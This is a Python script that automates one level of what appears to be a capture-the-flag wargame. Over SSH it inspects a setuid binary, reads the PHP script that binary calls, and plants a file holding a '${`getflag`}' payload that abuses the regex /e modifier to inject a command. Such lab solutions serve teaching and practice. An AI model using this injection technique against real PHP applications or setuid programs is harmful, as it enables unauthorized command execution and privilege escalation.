import sys

sys.path.append("../..")

from utils.ssh import sanitize_token, connect_by_previous, exec, save_token
from utils.text import print_title, print_output

client = connect_by_previous()
files_list = exec(client, 'ls', title='Get files list')
print_output(files_list)

file_info = exec(client, 'nm level06 | grep set', title='Inspect binary by nm')
print_output(file_info, 'Interested thing')
print_title('Set uid while execute, what we need!')

file_info = exec(client, 'strings level06 | grep *.php', title='Inspect binary by strings')
print_output(file_info, 'Interested thing')
print_title('Call .php file while executed, nice')

file_content = exec(client, 'cat level06.php', title='Read php file')
print_output(file_content)
print_title('Script read file from argv, /e Regexp mod, help us to execute our file instead just read, lets do this')

exec(client, "echo '[x ${`getflag`}]' > /tmp/tricky_thing", title='Create magic file')

token_raw = exec(client, './level06 /tmp/tricky_thing', title='Execute binary with our file via argv', err=True)[0]
print_output(token_raw)

token = sanitize_token(token_raw)
save_token(token)

client.close()
